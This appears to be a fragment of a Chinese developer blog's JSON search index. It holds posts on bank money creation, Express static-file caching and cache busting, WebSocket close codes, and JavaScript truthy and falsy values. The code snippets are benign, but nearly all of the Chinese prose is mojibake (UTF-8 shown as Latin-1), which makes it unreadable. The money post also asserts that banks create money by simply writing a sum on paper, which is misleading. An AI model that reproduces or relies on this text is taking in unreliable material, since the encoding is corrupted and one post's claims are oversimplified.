å•†äººéœ€è¦å»ºç­‘å•†æ¥å»ºç­‘æˆ¿å­ï¼Œè´¹ç”¨æ˜¯100ä¸‡ï¼Œä»˜ç»™å»ºç­‘å•†ï¼Œå»ºç­‘å•†åˆæŠŠ100æ”¯ç¥¨å­˜åˆ°é“¶è¡Œ\nåç§° è§’è‰² è´¦æˆ· A é“¶è¡Œå®¶ 100ä¸‡ç°é‡‘ B å»ºç­‘å•† 200ä¸‡ æ”¯ç¥¨ C å•†äºº 0 å•†äººåˆä»é“¶è¡Œå€Ÿé’±100ä¸‡ï¼Œæ¥ä»˜ç»™å»ºç­‘å•†å»ºæˆ¿å­ï¼Œå»ºç­‘å•†æŠŠé’±å­˜åˆ°é“¶è¡Œ\nåç§° è§’è‰² è´¦æˆ· A é“¶è¡Œå®¶ 100ä¸‡ç°é‡‘ B å»ºç­‘å•† 300ä¸‡ æ”¯ç¥¨ C å•†äºº 0 åªè¦è¿™ä¸ªå¾ªç¯è¿˜åœ¨ç»§ç»­ï¼Œä½ ä¼šå‘ç°ï¼Œå»ºç­‘å•†çš„è´¦é¢ä¸Šçš„æ”¯ç¥¨è¶Šæ¥è¶Šå¤šï¼Œä½†æ˜¯é“¶è¡Œå§‹ç»ˆéƒ½æ˜¯100ä¸‡ç°é‡‘å­˜åœ¨é‚£é‡Œï¼Œä»æ¥éƒ½æ²¡åŠ¨è¿‡ã€‚\nğŸ’°å°±è¿™æ ·é­”æœ¯èˆ¬çš„äº§ç”Ÿï¼Œ å¦‚æœé“¶è¡Œé‚£ä¸€å¤©ç¼ºé’±äº†ï¼Œé“¶è¡Œå°±æ‹¿ä¸€å¼ çº¸å‡ºæ¥ï¼Œä¸Šé¢å†™ç€1000ä¸‡ã€‚çœ‹ï¼é“¶è¡Œé€ é’±å°±æ˜¯é‚£ä¹ˆå®¹æ˜“ã€‚\n","permalink":"https://wdd.js.org/posts/2018/04/the-secret-of-bank-create-money/","summary":"1. è§’è‰²åˆ’åˆ† åç§° è§’è‰² è´¦æˆ· A é“¶è¡Œå®¶ 0 B å»ºç­‘å•† 100ä¸‡ C å•†äºº 0 2. å»ºç­‘å•†å‘é“¶è¡Œå­˜å‚¨100ä¸‡ åç§° è§’è‰² è´¦æˆ· A é“¶è¡Œå®¶ 100ä¸‡ ç°é‡‘ B å»ºç­‘å•† 100ä¸‡ æ”¯ç¥¨ C å•†äºº 0 2. å•†äººå‘é“¶è¡Œè´·æ¬¾100ä¸‡ æ­¤æ—¶é“¶è¡Œçš„è´¦æˆ·å­˜æ¬¾å·²ç»æ˜¯0äº†ï¼Œä½†æ˜¯Bè¿˜åœ¨é“¶è¡Œå­˜äº†100ä¸‡ã€‚é‚£é“¶è¡Œç©¶ç«Ÿæ˜¯è¿˜æœ‰100ä¸‡å‘¢, è¿˜æ˜¯ä¸€æ¯›éƒ½æ²¡æœ‰äº†å‘¢ã€‚\næ­¤æ—¶å»ºç­‘å•†å¦‚æœè¦å–ç°é‡‘ï¼Œé‚£ä¹ˆé“¶è¡Œé©¬ä¸Šå°±è¦ç ´äº§ã€‚\nåç§° è§’è‰² è´¦æˆ· A é“¶è¡Œå®¶ 100ç°é‡‘ B å»ºç­‘å•† 100ä¸‡ æ”¯ç¥¨ C å•†äºº 100ä¸‡ æ”¯ç¥¨ 3. å•†äººéœ€è¦å»ºç­‘å•†æ¥å»ºé€ æˆ¿å­ å•†äººéœ€è¦å»ºç­‘å•†æ¥å»ºç­‘æˆ¿å­ï¼Œè´¹ç”¨æ˜¯100ä¸‡ï¼Œä»˜ç»™å»ºç­‘å•†ï¼Œå»ºç­‘å•†åˆæŠŠ100æ”¯ç¥¨å­˜åˆ°é“¶è¡Œ\nåç§° è§’è‰² è´¦æˆ· A é“¶è¡Œå®¶ 100ä¸‡ç°é‡‘ B å»ºç­‘å•† 200ä¸‡ æ”¯ç¥¨ C å•†äºº 0 å•†äººåˆä»é“¶è¡Œå€Ÿé’±100ä¸‡ï¼Œæ¥ä»˜ç»™å»ºç­‘å•†å»ºæˆ¿å­ï¼Œå»ºç­‘å•†æŠŠé’±å­˜åˆ°é“¶è¡Œ\nåç§° è§’è‰² è´¦æˆ· A é“¶è¡Œå®¶ 100ä¸‡ç°é‡‘ B å»ºç­‘å•† 300ä¸‡ æ”¯ç¥¨ C å•†äºº 0 åªè¦è¿™ä¸ªå¾ªç¯è¿˜åœ¨ç»§ç»­ï¼Œä½ ä¼šå‘ç°ï¼Œå»ºç­‘å•†çš„è´¦é¢ä¸Šçš„æ”¯ç¥¨è¶Šæ¥è¶Šå¤šï¼Œä½†æ˜¯é“¶è¡Œå§‹ç»ˆéƒ½æ˜¯100ä¸‡ç°é‡‘å­˜åœ¨é‚£é‡Œï¼Œä»æ¥éƒ½æ²¡åŠ¨è¿‡ã€‚","title":"é‡‘é’±æ¸¸æˆ - é“¶è¡Œé€ é’±çš„ç§˜å¯†"},{"content":"1. Expressè®¾ç½®ç¼“å­˜ Expressè®¾ç½®é™æ€æ–‡ä»¶çš„æ–¹æ³•å¾ˆç®€å•ï¼Œä¸€è¡Œä»£ç æå®šã€‚app.use(express.static(path.join(__dirname, 'public'), {maxAge: MAX_AGE})), æ³¨æ„MAX_AGEçš„å•ä½æ˜¯æ¯«ç§’ã€‚è¿™å¥ä»£ç çš„å«ä¹‰æ˜¯è®©pulicç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶éƒ½å¯ä»¥åœ¨æµè§ˆå™¨ä¸­ç¼“å­˜ï¼Œè¿‡æœŸæ—¶é•¿ä¸ºMAX_AGEæ¯«ç§’ã€‚\napp.use(express.static(path.join(__dirname, \u0026#39;public\u0026#39;), {maxAge: config.get(\u0026#39;maxAge\u0026#39;)})) 2. Expressè®©æµè§ˆå™¨æ¸…é™¤ç¼“å­˜ ç¼“å­˜çš„å¥½å¤„æ˜¯å¯ä»¥æ›´å¿«çš„è®¿é—®æœåŠ¡ï¼Œä½†æ˜¯ç¼“å­˜ä¹Ÿæœ‰åå¤„ã€‚ä¾‹å¦‚è®¾ç½®ç¼“å­˜ä¸º10å¤©ï¼Œç¬¬äºŒå¤©çš„æ—¶å€™æœåŠ¡æ›´æ–°äº†ã€‚å¦‚æœå®¢æˆ·ç«¯ä¸å¼ºåˆ¶åˆ·æ–°é¡µé¢çš„è¯ï¼Œæµè§ˆå™¨ä¼šä¸€è‡´ä½¿ç”¨æ›´æ–°å‰çš„é™æ€æ–‡ä»¶ï¼Œè¿™æ ·ä¼šå¯¼è‡´ä¸€äº›BUGã€‚ä½ æ€»å½“æ¯æ¬¡å‡ºé—®é¢˜æ—¶ï¼Œå®¢æˆ·æ‰“ç”µè¯ç»™ä½ åï¼Œä½ è®©ä»–å¼ºåˆ¶åˆ·æ–°æµè§ˆå™¨å§ï¼Ÿ\næ‰€ä»¥ï¼Œæœ€å¥½åœ¨æœåŠ¡é‡å¯åï¼Œé‡æ–°è®©æµè§ˆå™¨è·å–æœ€æ–°çš„é™æ€æ–‡ä»¶ã€‚\nè®¾ç½®çš„æ–¹å¼æ˜¯ç»™æ¯ä¸€ä¸ªé™æ€æ–‡ä»¶è®¾ç½®ä¸€ä¸ªæ—¶é—´æˆ³ã€‚\nä¾‹å¦‚ï¼švendor/loadjs/load.js?_=123898923423\u0026quot;\u0026gt;\u0026lt;/script\u0026gt;\n2.1. Express è·¯ç”± // /routes/index.js router.get(\u0026#39;/home\u0026#39;, function (req, res, next) { res.render(\u0026#39;home\u0026#39;, {config: config, serverStartTimestamp: new Date().getTime()}) }) 2.2. è§†å›¾æ–‡ä»¶ // views/home.html \u0026lt;script src=\u0026#34;vendor/loadjs/load.js?_=\u0026lt;%= serverStartTimestamp %\u0026gt;\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; è®¾ç½®ä¹‹åï¼Œæ¯æ¬¡æœåŠ¡æ›´æ–°æˆ–è€…é‡å¯ï¼Œæµè§ˆå™¨éƒ½ä¼šä½¿ç”¨æœ€æ–°çš„æ—¶é—´æˆ³serverStartTimestampï¼Œå»è·å–é™æ€æ–‡ä»¶ã€‚\n2.3. åŠ¨æ€åŠ è½½JSæ–‡ä»¶ æœ‰æ—¶å€™jsæ–‡ä»¶å¹¶ä¸æ˜¯ç›´æ¥åœ¨HTMLä¸­å¼•å…¥ï¼Œå¯èƒ½æ˜¯ä½¿ç”¨äº†ä¸€äº›jsæ–‡ä»¶åŠ è½½åº“ï¼Œä¾‹å¦‚requirejs, LABjsç­‰ã€‚è¿™äº›æƒ…å†µä¸‹ï¼Œå¯ä»¥åœ¨å…¨å±€è®¾ç½®ç¯å¢ƒå˜é‡SERVER_START_TIMESTAMPï¼Œç”¨æ¥è¡¨ç¤ºæœåŠ¡å¯åŠ¨çš„æ—¶é—´æˆ³ï¼Œåœ¨è·å–jsçš„æ—¶å€™ï¼Œå°†è¯¥æ—¶é—´æˆ³æ‹¼æ¥åœ¨è·¯å¾„ä¸Šã€‚\næ³¨æ„ï¼šç¯å¢ƒå˜é‡SERVER_START_TIMESTAMPï¼Œä¸€å®šè¦åœ¨å…¶ä»–è„šæœ¬ä½¿ç”¨å‰å®šä¹‰ã€‚\n// views/home.html \u0026lt;script\u0026gt; var SERVER_START_TIMESTAMP = \u0026lt;%= serverStartTimestamp %\u0026gt; \u0026lt;/script\u0026gt; // load.js \u0026#39;vendor/contact-center/skill.js?_=\u0026#39; + SERVER_START_TIMESTAMP ","permalink":"https://wdd.js.org/posts/2018/04/express-static-file-cache-setting-and-cleaning/","summary":"1. Expressè®¾ç½®ç¼“å­˜ Expressè®¾ç½®é™æ€æ–‡ä»¶çš„æ–¹æ³•å¾ˆç®€å•ï¼Œä¸€è¡Œä»£ç æå®šã€‚app.use(express.static(path.join(__dirname, 'public'), {maxAge: MAX_AGE})), æ³¨æ„MAX_AGEçš„å•ä½æ˜¯æ¯«ç§’ã€‚è¿™å¥ä»£ç çš„å«ä¹‰æ˜¯è®©pulicç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶éƒ½å¯ä»¥åœ¨æµè§ˆå™¨ä¸­ç¼“å­˜ï¼Œè¿‡æœŸæ—¶é•¿ä¸ºMAX_AGEæ¯«ç§’ã€‚\napp.use(express.static(path.join(__dirname, \u0026#39;public\u0026#39;), {maxAge: config.get(\u0026#39;maxAge\u0026#39;)})) 2. Expressè®©æµè§ˆå™¨æ¸…é™¤ç¼“å­˜ ç¼“å­˜çš„å¥½å¤„æ˜¯å¯ä»¥æ›´å¿«çš„è®¿é—®æœåŠ¡ï¼Œä½†æ˜¯ç¼“å­˜ä¹Ÿæœ‰åå¤„ã€‚ä¾‹å¦‚è®¾ç½®ç¼“å­˜ä¸º10å¤©ï¼Œç¬¬äºŒå¤©çš„æ—¶å€™æœåŠ¡æ›´æ–°äº†ã€‚å¦‚æœå®¢æˆ·ç«¯ä¸å¼ºåˆ¶åˆ·æ–°é¡µé¢çš„è¯ï¼Œæµè§ˆå™¨ä¼šä¸€è‡´ä½¿ç”¨æ›´æ–°å‰çš„é™æ€æ–‡ä»¶ï¼Œè¿™æ ·ä¼šå¯¼è‡´ä¸€äº›BUGã€‚ä½ æ€»å½“æ¯æ¬¡å‡ºé—®é¢˜æ—¶ï¼Œå®¢æˆ·æ‰“ç”µè¯ç»™ä½ åï¼Œä½ è®©ä»–å¼ºåˆ¶åˆ·æ–°æµè§ˆå™¨å§ï¼Ÿ\næ‰€ä»¥ï¼Œæœ€å¥½åœ¨æœåŠ¡é‡å¯åï¼Œé‡æ–°è®©æµè§ˆå™¨è·å–æœ€æ–°çš„é™æ€æ–‡ä»¶ã€‚\nè®¾ç½®çš„æ–¹å¼æ˜¯ç»™æ¯ä¸€ä¸ªé™æ€æ–‡ä»¶è®¾ç½®ä¸€ä¸ªæ—¶é—´æˆ³ã€‚\nä¾‹å¦‚ï¼švendor/loadjs/load.js?_=123898923423\u0026quot;\u0026gt;\u0026lt;/script\u0026gt;\n2.1. Express è·¯ç”± // /routes/index.js router.get(\u0026#39;/home\u0026#39;, function (req, res, next) { res.render(\u0026#39;home\u0026#39;, {config: config, serverStartTimestamp: new Date().getTime()}) }) 2.2. è§†å›¾æ–‡ä»¶ // views/home.html \u0026lt;script src=\u0026#34;vendor/loadjs/load.js?_=\u0026lt;%= serverStartTimestamp %\u0026gt;\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; è®¾ç½®ä¹‹åï¼Œæ¯æ¬¡æœåŠ¡æ›´æ–°æˆ–è€…é‡å¯ï¼Œæµè§ˆå™¨éƒ½ä¼šä½¿ç”¨æœ€æ–°çš„æ—¶é—´æˆ³serverStartTimestampï¼Œå»è·å–é™æ€æ–‡ä»¶ã€‚\n2.3. åŠ¨æ€åŠ è½½JSæ–‡ä»¶ æœ‰æ—¶å€™jsæ–‡ä»¶å¹¶ä¸æ˜¯ç›´æ¥åœ¨HTMLä¸­å¼•å…¥ï¼Œå¯èƒ½æ˜¯ä½¿ç”¨äº†ä¸€äº›jsæ–‡ä»¶åŠ è½½åº“ï¼Œä¾‹å¦‚requirejs, LABjsç­‰ã€‚è¿™äº›æƒ…å†µä¸‹ï¼Œå¯ä»¥åœ¨å…¨å±€è®¾ç½®ç¯å¢ƒå˜é‡SERVER_START_TIMESTAMPï¼Œç”¨æ¥è¡¨ç¤ºæœåŠ¡å¯åŠ¨çš„æ—¶é—´æˆ³ï¼Œåœ¨è·å–jsçš„æ—¶å€™ï¼Œå°†è¯¥æ—¶é—´æˆ³æ‹¼æ¥åœ¨è·¯å¾„ä¸Šã€‚\næ³¨æ„ï¼šç¯å¢ƒå˜é‡SERVER_START_TIMESTAMPï¼Œä¸€å®šè¦åœ¨å…¶ä»–è„šæœ¬ä½¿ç”¨å‰å®šä¹‰ã€‚\n// views/home.html \u0026lt;script\u0026gt; var SERVER_START_TIMESTAMP = \u0026lt;%= serverStartTimestamp %\u0026gt; \u0026lt;/script\u0026gt; // load.js \u0026#39;vendor/contact-center/skill.js?_=\u0026#39; + SERVER_START_TIMESTAMP ","title":"Expressé™æ€æ–‡ä»¶æµè§ˆå™¨ç¼“å­˜è®¾ç½®ä¸ç¼“å­˜æ¸…é™¤"},{"content":"1. æŠŠé”™è¯¯æ‰“å°å‡ºæ¥ WebSocketæ–­å¼€çš„åŸå› æœ‰å¾ˆå¤šï¼Œæœ€å¥½åœ¨WebSocketæ–­å¼€æ—¶ï¼Œå°†é”™è¯¯æ‰“å°å‡ºæ¥ã€‚\nåœ¨çº¿demoåœ°å€ï¼šhttps://wdd.js.org/websocket-demos/\nws.onerror = function (e) { console.log(\u0026#39;WebSocketå‘ç”Ÿé”™è¯¯: \u0026#39; + e.code) console.log(e) } å¦‚æœä½ æƒ³è‡ªå·±ç©ç©WebSocket, ä½†æ˜¯ä½ åˆä¸æƒ³è‡ªå·±éƒ¨ç½²ä¸€ä¸ªWebSocketæœåŠ¡å™¨ï¼Œä½ å¯ä»¥ä½¿ç”¨ws = new WebSocket('wss://echo.websocket.org/'), ä½ å‘echo.websocket.orgå‘é€æ¶ˆæ¯ï¼Œå®ƒä¼šå›å¤ä½ åŒæ ·çš„æ¶ˆæ¯ã€‚\n2. é‡è¦ä¿¡æ¯é”™è¯¯çŠ¶æ€ç  WebSocketæ–­å¼€æ—¶ï¼Œä¼šè§¦å‘CloseEvent, CloseEventä¼šåœ¨è¿æ¥å…³é—­æ—¶å‘é€ç»™ä½¿ç”¨ WebSockets çš„å®¢æˆ·ç«¯. å®ƒåœ¨ WebSocket å¯¹è±¡çš„ onclose äº‹ä»¶ç›‘å¬å™¨ä¸­ä½¿ç”¨ã€‚CloseEventçš„codeå­—æ®µè¡¨ç¤ºäº†WebSocketæ–­å¼€çš„åŸå› ã€‚å¯ä»¥ä»è¯¥å­—æ®µä¸­åˆ†ææ–­å¼€çš„åŸå› ã€‚\n3. å…³é—­çŠ¶æ€ç è¡¨ ä¸€èˆ¬æ¥è¯´1006çš„é”™è¯¯ç å‡ºç°çš„æƒ…å†µæ¯”è¾ƒå¸¸è§ï¼Œè¯¥é”™è¯¯ç ä¸€èˆ¬å‡ºç°åœ¨æ–­ç½‘æ—¶ã€‚\nçŠ¶æ€ç  åç§° æè¿° 0â€“999 ä¿ç•™æ®µ, æœªä½¿ç”¨. 1000 CLOSE_NORMAL æ­£å¸¸å…³é—­; æ— è®ºä¸ºä½•ç›®çš„è€Œåˆ›å»º, è¯¥é“¾æ¥éƒ½å·²æˆåŠŸå®Œæˆä»»åŠ¡. 1001 CLOSE_GOING_AWAY ç»ˆç«¯ç¦»å¼€, å¯èƒ½å› ä¸ºæœåŠ¡ç«¯é”™è¯¯, ä¹Ÿå¯èƒ½å› ä¸ºæµè§ˆå™¨æ­£ä»æ‰“å¼€è¿æ¥çš„é¡µé¢è·³è½¬ç¦»å¼€. 1002 CLOSE_PROTOCOL_ERROR ç”±äºåè®®é”™è¯¯è€Œä¸­æ–­è¿æ¥. 1003 CLOSE_UNSUPPORTED ç”±äºæ¥æ”¶åˆ°ä¸å…è®¸çš„æ•°æ®ç±»å‹è€Œæ–­å¼€è¿æ¥ (å¦‚ä»…æ¥æ”¶æ–‡æœ¬æ•°æ®çš„ç»ˆç«¯æ¥æ”¶åˆ°äº†äºŒè¿›åˆ¶æ•°æ®). 1004 ä¿ç•™. å…¶æ„ä¹‰å¯èƒ½ä¼šåœ¨æœªæ¥å®šä¹‰. 1005 CLOSE_NO_STATUS ä¿ç•™. è¡¨ç¤ºæ²¡æœ‰æ”¶åˆ°é¢„æœŸçš„çŠ¶æ€ç . 1006 CLOSE_ABNORMAL ä¿ç•™. ç”¨äºæœŸæœ›æ”¶åˆ°çŠ¶æ€ç æ—¶è¿æ¥éæ­£å¸¸å…³é—­ (ä¹Ÿå°±æ˜¯è¯´, æ²¡æœ‰å‘é€å…³é—­å¸§). 1007 Unsupported Data ç”±äºæ”¶åˆ°äº†æ ¼å¼ä¸ç¬¦çš„æ•°æ®è€Œæ–­å¼€è¿æ¥ (å¦‚æ–‡æœ¬æ¶ˆæ¯ä¸­åŒ…å«äº†é UTF-8 æ•°æ®). 1008 Policy Violation ç”±äºæ”¶åˆ°ä¸ç¬¦åˆçº¦å®šçš„æ•°æ®è€Œæ–­å¼€è¿æ¥. è¿™æ˜¯ä¸€ä¸ªé€šç”¨çŠ¶æ€ç , ç”¨äºä¸é€‚åˆä½¿ç”¨ 1003 å’Œ 1009 çŠ¶æ€ç çš„åœºæ™¯. 1009 CLOSE_TOO_LARGE ç”±äºæ”¶åˆ°è¿‡å¤§çš„æ•°æ®å¸§è€Œæ–­å¼€è¿æ¥. 1010 Missing Extension å®¢æˆ·ç«¯æœŸæœ›æœåŠ¡å™¨å•†å®šä¸€ä¸ªæˆ–å¤šä¸ªæ‹“å±•, ä½†æœåŠ¡å™¨æ²¡æœ‰å¤„ç†, å› æ­¤å®¢æˆ·ç«¯æ–­å¼€è¿æ¥. 1011 Internal Error å®¢æˆ·ç«¯ç”±äºé‡åˆ°æ²¡æœ‰é¢„æ–™çš„æƒ…å†µé˜»æ­¢å…¶å®Œæˆè¯·æ±‚, å› æ­¤æœåŠ¡ç«¯æ–­å¼€è¿æ¥. 1012 Service Restart æœåŠ¡å™¨ç”±äºé‡å¯è€Œæ–­å¼€è¿æ¥. 1013 Try Again Later æœåŠ¡å™¨ç”±äºä¸´æ—¶åŸå› æ–­å¼€è¿æ¥, å¦‚æœåŠ¡å™¨è¿‡è½½å› æ­¤æ–­å¼€ä¸€éƒ¨åˆ†å®¢æˆ·ç«¯è¿æ¥. 1014 ç”± WebSocketæ ‡å‡†ä¿ç•™ä»¥ä¾¿æœªæ¥ä½¿ç”¨. 1015 TLS Handshake ä¿ç•™. è¡¨ç¤ºè¿æ¥ç”±äºæ— æ³•å®Œæˆ TLS æ¡æ‰‹è€Œå…³é—­ (ä¾‹å¦‚æ— æ³•éªŒè¯æœåŠ¡å™¨è¯ä¹¦). 1016â€“1999 ç”± WebSocketæ ‡å‡†ä¿ç•™ä»¥ä¾¿æœªæ¥ä½¿ç”¨. 2000â€“2999 ç”± WebSocketæ‹“å±•ä¿ç•™ä½¿ç”¨. 3000â€“3999 å¯ä»¥ç”±åº“æˆ–æ¡†æ¶ä½¿ç”¨.? ä¸åº”ç”±åº”ç”¨ä½¿ç”¨. å¯ä»¥åœ¨ IANA æ³¨å†Œ, å…ˆåˆ°å…ˆå¾—. 4000â€“4999 å¯ä»¥ç”±åº”ç”¨ä½¿ç”¨. 4. å…¶ä»–æ³¨æ„äº‹é¡¹ å¦‚æœä½ çš„æœåŠ¡æ‰€åœ¨çš„åŸŸæ˜¯HTTPSçš„ï¼Œé‚£ä¹ˆä½¿ç”¨çš„WebSocketåè®®ä¹Ÿå¿…é¡»æ˜¯wss, è€Œä¸èƒ½æ˜¯ws\n5. å¦‚ä½•åœ¨è€IEä¸Šä½¿ç”¨åŸç”ŸWebSocketï¼Ÿ web-socket-jsæ˜¯åŸºäºflashçš„æŠ€æœ¯ï¼Œåªéœ€è¦å¼•å…¥ä¸¤ä¸ªjsæ–‡ä»¶å’Œä¸€ä¸ªswfæ–‡ä»¶ï¼Œå°±å¯ä»¥è®©æµè§ˆå™¨ç”¨äºå‡ ä¹åŸç”Ÿçš„WebSocketæ¥å£ã€‚å¦å¤–ï¼Œweb-socket-jsè¿˜æ˜¯éœ€è¦åœ¨wsæœåŠ¡ç«¯843ç«¯å£åšä¸€ä¸ªflashå®‰å…¨ç­–ç•¥æ–‡ä»¶çš„æœåŠ¡ã€‚\næˆ‘è‡ªå·±æ›¾ç»åŸºäºstompjså’Œweb-socket-jsï¼ŒåšWebSocketå…¼å®¹åˆ°IE5, å½“ç„¶äº†stompjsåœ¨ä½ç‰ˆæœ¬çš„IEä¸Šæœ‰å…¼å®¹æ€§é—®é¢˜, è€Œä¸”stompjså·²ç»ä¸å†ç»´æŠ¤äº†ï¼Œä½ å¯ä»¥ä½¿ç”¨æˆ‘forkçš„ä¸€ä¸ªç‰ˆæœ¬ï¼Œåœ°å€æ˜¯ï¼šhttps://github.com/wangduanduan/stomp-websocket/blob/master/lib/stomp.js\nä¸»è¦æ˜¯è€ç‰ˆæœ¬IEåœ¨æ­£åˆ™è¡¨è¾¾å¼è¡Œä¸ºæ–¹é¢æœ‰ç‚¹å¼‚å¸¸ã€‚\n// fix ie8, ie9, RegExp not normal problem // in chrome the frames length will be 2, but in ie8, ie9, it well be 1 // by wdd 20180321 if (frames.length === 1) { frames.push(\u0026#39;\u0026#39;) } 6. å‚è€ƒ CloseEvent getting the reason why websockets closed with close code 1006 Defined Status Codes ","permalink":"https://wdd.js.org/posts/2018/03/websocket-close-reasons/","summary":"1. æŠŠé”™è¯¯æ‰“å°å‡ºæ¥ WebSocketæ–­å¼€çš„åŸå› æœ‰å¾ˆå¤šï¼Œæœ€å¥½åœ¨WebSocketæ–­å¼€æ—¶ï¼Œå°†é”™è¯¯æ‰“å°å‡ºæ¥ã€‚\nåœ¨çº¿demoåœ°å€ï¼šhttps://wdd.js.org/websocket-demos/\nws.onerror = function (e) { console.log(\u0026#39;WebSocketå‘ç”Ÿé”™è¯¯: \u0026#39; + e.code) console.log(e) } å¦‚æœä½ æƒ³è‡ªå·±ç©ç©WebSocket, ä½†æ˜¯ä½ åˆä¸æƒ³è‡ªå·±éƒ¨ç½²ä¸€ä¸ªWebSocketæœåŠ¡å™¨ï¼Œä½ å¯ä»¥ä½¿ç”¨ws = new WebSocket('wss://echo.websocket.org/'), ä½ å‘echo.websocket.orgå‘é€æ¶ˆæ¯ï¼Œå®ƒä¼šå›å¤ä½ åŒæ ·çš„æ¶ˆæ¯ã€‚\n2. é‡è¦ä¿¡æ¯é”™è¯¯çŠ¶æ€ç  WebSocketæ–­å¼€æ—¶ï¼Œä¼šè§¦å‘CloseEvent, CloseEventä¼šåœ¨è¿æ¥å…³é—­æ—¶å‘é€ç»™ä½¿ç”¨ WebSockets çš„å®¢æˆ·ç«¯. å®ƒåœ¨ WebSocket å¯¹è±¡çš„ onclose äº‹ä»¶ç›‘å¬å™¨ä¸­ä½¿ç”¨ã€‚CloseEventçš„codeå­—æ®µè¡¨ç¤ºäº†WebSocketæ–­å¼€çš„åŸå› ã€‚å¯ä»¥ä»è¯¥å­—æ®µä¸­åˆ†ææ–­å¼€çš„åŸå› ã€‚\n3. å…³é—­çŠ¶æ€ç è¡¨ ä¸€èˆ¬æ¥è¯´1006çš„é”™è¯¯ç å‡ºç°çš„æƒ…å†µæ¯”è¾ƒå¸¸è§ï¼Œè¯¥é”™è¯¯ç ä¸€èˆ¬å‡ºç°åœ¨æ–­ç½‘æ—¶ã€‚\nçŠ¶æ€ç  åç§° æè¿° 0â€“999 ä¿ç•™æ®µ, æœªä½¿ç”¨. 1000 CLOSE_NORMAL æ­£å¸¸å…³é—­; æ— è®ºä¸ºä½•ç›®çš„è€Œåˆ›å»º, è¯¥é“¾æ¥éƒ½å·²æˆåŠŸå®Œæˆä»»åŠ¡. 1001 CLOSE_GOING_AWAY ç»ˆç«¯ç¦»å¼€, å¯èƒ½å› ä¸ºæœåŠ¡ç«¯é”™è¯¯, ä¹Ÿå¯èƒ½å› ä¸ºæµè§ˆå™¨æ­£ä»æ‰“å¼€è¿æ¥çš„é¡µé¢è·³è½¬ç¦»å¼€. 1002 CLOSE_PROTOCOL_ERROR ç”±äºåè®®é”™è¯¯è€Œä¸­æ–­è¿æ¥. 1003 CLOSE_UNSUPPORTED ç”±äºæ¥æ”¶åˆ°ä¸å…è®¸çš„æ•°æ®ç±»å‹è€Œæ–­å¼€è¿æ¥ (å¦‚ä»…æ¥æ”¶æ–‡æœ¬æ•°æ®çš„ç»ˆç«¯æ¥æ”¶åˆ°äº†äºŒè¿›åˆ¶æ•°æ®). 1004 ä¿ç•™. å…¶æ„ä¹‰å¯èƒ½ä¼šåœ¨æœªæ¥å®šä¹‰. 1005 CLOSE_NO_STATUS ä¿ç•™. è¡¨ç¤ºæ²¡æœ‰æ”¶åˆ°é¢„æœŸçš„çŠ¶æ€ç . 1006 CLOSE_ABNORMAL ä¿ç•™. ç”¨äºæœŸæœ›æ”¶åˆ°çŠ¶æ€ç æ—¶è¿æ¥éæ­£å¸¸å…³é—­ (ä¹Ÿå°±æ˜¯è¯´, æ²¡æœ‰å‘é€å…³é—­å¸§).","title":"WebSocketæ–­å¼€åŸå› åˆ†æ"},{"content":"æ— è®ºä»€ä¹ˆè¯­è¨€ï¼Œéƒ½éœ€è¦é€»è¾‘ï¼Œè€Œé€»è¾‘ä¸­ï¼Œèƒ½å¦åˆ¤æ–­å‡ºçœŸå‡ï¼Œæ˜¯æœ€åŸºæœ¬ä¹Ÿæ˜¯æœ€é‡è¦æŠ€èƒ½ä¹‹ä¸€ã€‚\nJSä¸­çš„å‡å€¼æœ‰6ä¸ª false '' undefinded null 0, +0, -0 NaN æœ‰ç‚¹ç±»ä¼¼å‡å€¼çš„çœŸå€¼æœ‰ä¸¤ä¸ª {} [] ç©ºå¯¹è±¡å’Œç©ºæ•°ç»„ï¼Œå¾ˆå¤šåˆå­¦è€…éƒ½å¾ˆç”¨æŠŠè¿™ä¸¤ä¸ªå½“åšå‡å€¼ã€‚ä½†æ˜¯å®é™…ä¸Šä»–ä»¬æ˜¯çœŸå€¼ï¼Œä½ åªéœ€è¦è®°ä½ï¼Œé™¤äº†nullä¹‹å¤–çš„æ‰€æœ‰å¯¹è±¡ç±»å‹çš„æ•°æ®ï¼Œéƒ½æ˜¯çœŸå€¼ã€‚\ntypeof null // \u0026#39;object\u0026#39; æ®è¯´ï¼štypeof nullè¿”å›å¯¹è±¡è¿™æ˜¯ä¸€ä¸ªjsè¯­è¨€ä¸­çš„bugã€‚å®é™…ä¸Štypeof nullåº”è¯¥è¿”å›nullæ‰æ¯”è¾ƒå‡†ç¡®ï¼Œä½†æ˜¯è¿™ä¸ªbugå·²ç»å­˜æ¥å¥½ä¹…äº†ã€‚å‡ ä¹æ‰€æœ‰çš„ä»£ç é‡Œéƒ½è¿™æ ·å»åˆ¤æ–­ã€‚å¦‚æœæŠŠtypeof nullç»™æ”¹æˆè¿”å›null, é‚£ä¹ˆè¿™å¿…å®šä¼šå¯¼è‡´JSä¸–ç•Œæœ«æ—¥ã€‚\næˆ‘ä»¬æ‰¿è®¤JSå¹¶ä¸å®Œç¾ï¼Œå¥¹æœ‰å¾ˆå¤šå°ç¼ºç‚¹ï¼Œä½†æ˜¯è¿™å¹¶ä¸å¦¨ç¢å¥¹å¸å¼•ä¸‡åƒå¼€å‘è€…æ‹œå€’åœ¨å¥¹çš„çŸ³æ¦´è£™ä¸‹ã€‚\nå°±åƒä¸€é¦–æ­Œå”±çš„ï¼šæœ‰äº›äººè¯´ä¸æ¸…å“ªé‡Œå¥½ ä½†å°±æ˜¯è°éƒ½æ›¿ä»£ä¸äº†\n","permalink":"https://wdd.js.org/posts/2018/03/js-true-and-false-value/","summary":"æ— è®ºä»€ä¹ˆè¯­è¨€ï¼Œéƒ½éœ€è¦é€»è¾‘ï¼Œè€Œé€»è¾‘ä¸­ï¼Œèƒ½å¦åˆ¤æ–­å‡ºçœŸå‡ï¼Œæ˜¯æœ€åŸºæœ¬ä¹Ÿæ˜¯æœ€é‡è¦æŠ€èƒ½ä¹‹ä¸€ã€‚\nJSä¸­çš„å‡å€¼æœ‰6ä¸ª false '' undefinded null 0, +0, -0 NaN æœ‰ç‚¹ç±»ä¼¼å‡å€¼çš„çœŸå€¼æœ‰ä¸¤ä¸ª {} [] 